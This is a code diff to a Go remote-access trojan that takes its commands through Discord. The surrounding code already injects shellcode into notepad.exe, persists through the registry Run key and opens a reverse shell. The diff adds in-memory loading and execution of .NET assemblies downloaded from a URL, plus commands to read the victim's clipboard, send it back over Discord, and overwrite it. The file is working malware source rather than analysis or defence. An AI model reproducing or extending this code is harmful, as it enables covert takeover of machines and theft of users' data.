@@ -9,6 +9,7 @@ import (
 	"fmt"
 	"time"
 	"image"
+	"runtime"
 	"strings"
 	"strconv"
 	"syscall"
@@ -27,9 +28,10 @@ import (
 	"github.com/bwmarrin/discordgo"
 	"github.com/vova616/screenshot"
 	"github.com/mitchellh/go-ps"
-
+	"github.com/atotto/clipboard"
 	"github.com/google/uuid"
 	
+	clr "github.com/ropnop/go-clr"
 )
 
 type shellcode struct {
@@ -37,7 +39,7 @@ type shellcode struct {
 }
 
 
-var DISCORD_TOKEN string = "YOUR_DISCORD_TOKEN_HERE"
+var DISCORD_TOKEN string = "YOUR_TOKEN_HERE"
 
 var RSHELL_HOST string
 var RSHELL_PORT int
@@ -58,6 +60,15 @@ func setInactive(identifier string) {
 	}
 }
 
+func ReadClipboard() string {
+	text, _ := clipboard.ReadAll()
+	return text
+}
+
+func WriteClipboard(text string) {
+	clipboard.WriteAll(text)
+}
+
 func ExePath() string {
 	ex, err := os.Executable()
 	if err != nil {
@@ -65,6 +76,95 @@ func ExePath() string {
 	}
 	exPath := filepath.Dir(ex)
 	return exPath
+}
+
+func checkOK(hr uintptr, caller string) {
+	if hr != 0x0 {
+		fmt.Println("%s returned 0x%08x", caller, hr)
+	}
+}
+
+func ExecDotNetAssembly(assemblybytes []byte) {
+	runtime.KeepAlive(assemblybytes)
+
+	var pMetaHost uintptr
+	hr := clr.CLRCreateInstance(&clr.CLSID_CLRMetaHost, &clr.IID_ICLRMetaHost, &pMetaHost)
+	checkOK(hr, "CLRCreateInstance")
+	metaHost := clr.NewICLRMetaHostFromPtr(pMetaHost)
+
+	versionString := "v4.0.30319"
+	pwzVersion, _ := syscall.UTF16PtrFromString(versionString)
+	var pRuntimeInfo uintptr
+	hr = metaHost.GetRuntime(pwzVersion, &clr.IID_ICLRRuntimeInfo, &pRuntimeInfo)
+	checkOK(hr, "metahost.GetRuntime")
+	runtimeInfo := clr.NewICLRRuntimeInfoFromPtr(pRuntimeInfo)
+
+	var isLoadable bool
+	hr = runtimeInfo.IsLoadable(&isLoadable)
+	checkOK(hr, "runtimeInfo.IsLoadable")
+	if !isLoadable {
+		fmt.Println("[!] IsLoadable returned false. Bailing...")
+	}
+
+	hr = runtimeInfo.BindAsLegacyV2Runtime()
+	checkOK(hr, "runtimeInfo.BindAsLegacyV2Runtime")
+
+	var pRuntimeHost uintptr
+	hr = runtimeInfo.GetInterface(&clr.CLSID_CorRuntimeHost, &clr.IID_ICorRuntimeHost, &pRuntimeHost)
+	runtimeHost := clr.NewICORRuntimeHostFromPtr(pRuntimeHost)
+	hr = runtimeHost.Start()
+	checkOK(hr, "runtimeHost.Start")
+	fmt.Println("[+] Loaded CLR into this process")
+
+	var pAppDomain uintptr
+	var pIUnknown uintptr
+	hr = runtimeHost.GetDefaultDomain(&pIUnknown)
+	checkOK(hr, "runtimeHost.GetDefaultDomain")
+	iu := clr.NewIUnknownFromPtr(pIUnknown)
+	hr = iu.QueryInterface(&clr.IID_AppDomain, &pAppDomain)
+	checkOK(hr, "iu.QueryInterface")
+	appDomain := clr.NewAppDomainFromPtr(pAppDomain)
+	fmt.Println("[+] Got default AppDomain")
+
+	safeArray, err := clr.CreateSafeArray(assemblybytes)
+	fmt.Println(err)
+	runtime.KeepAlive(safeArray)
+	fmt.Println("[+] Crated SafeArray from byte array")
+
+	var pAssembly uintptr
+	hr = appDomain.Load_3(uintptr(unsafe.Pointer(&safeArray)), &pAssembly)
+	checkOK(hr, "appDomain.Load_3")
+	assembly := clr.NewAssemblyFromPtr(pAssembly)
+	fmt.Printf("[+] Executable loaded into memory at 0x%08x\n", pAssembly)
+
+	var pEntryPointInfo uintptr
+	hr = assembly.GetEntryPoint(&pEntryPointInfo)
+	checkOK(hr, "assembly.GetEntryPoint")
+	fmt.Printf("[+] Executable entrypoint found at 0x%08x. Calling...\n", pEntryPointInfo)
+	fmt.Println("-------")
+	methodInfo := clr.NewMethodInfoFromPtr(pEntryPointInfo)
+
+	var pRetCode uintptr
+	nullVariant := clr.Variant{
+		VT:  1,
+		Val: uintptr(0),
+	}
+	
+	hr = methodInfo.Invoke_3(
+		nullVariant,
+		uintptr(0),
+		&pRetCode)
+
+	fmt.Println("-------")
+
+	checkOK(hr, "methodInfo.Invoke_3")
+	fmt.Printf("[+] Executable returned code %d\n", pRetCode)
+
+	appDomain.Release()
+	runtimeHost.Release()
+	runtimeInfo.Release()
+	metaHost.Release()
+
 }
 
 func CurrentUserPersist() {
@@ -331,7 +431,7 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 	if strings.HasPrefix(m.Content, "!set-inactive ") {
 		id := m.Content[14:]
 		setInactive(id)
-		if ACTIVE_STATUS == true {
+		if ACTIVE_STATUS == false {
 			s.ChannelMessageSend(m.ChannelID, "Agent: " + id + " has been set to inactive status.")
 		}
 	}
@@ -353,6 +453,14 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 			s.ChannelMessageSend(m.ChannelID, "Attempting to execute shellcode located at " + u)
 			se := getShellcode(u)
 			go process_injection(se, "notepad.exe")
+	
+		}
+
+		if strings.HasPrefix(m.Content, "!exec-assembly ") {
+			u := m.Content[15:]
+			s.ChannelMessageSend(m.ChannelID, "Attempting to execute assembly located at " + u)
+			asm := getShellcode(u)
+			go ExecDotNetAssembly(asm)
 	
 		}
 	
@@ -380,6 +488,17 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 		if m.Content == "!persist-user" {
 			s.ChannelMessageSend(m.ChannelID, "Attempting to persist to registry Current User run")
 			go CurrentUserPersist()
+		}
+
+		if m.Content == "!get-clipboard" {
+			text := ReadClipboard()
+			s.ChannelMessageSend(m.ChannelID, text)
+		}
+
+		if strings.HasPrefix(m.Content, "!set-clipboard ") {
+			text := m.Content[15:]
+			s.ChannelMessageSend(m.ChannelID, "Setting contents of clipboard to: " + text)
+			go WriteClipboard(text)
 		}
 
 		if m.Content == "!reverse-shell" {
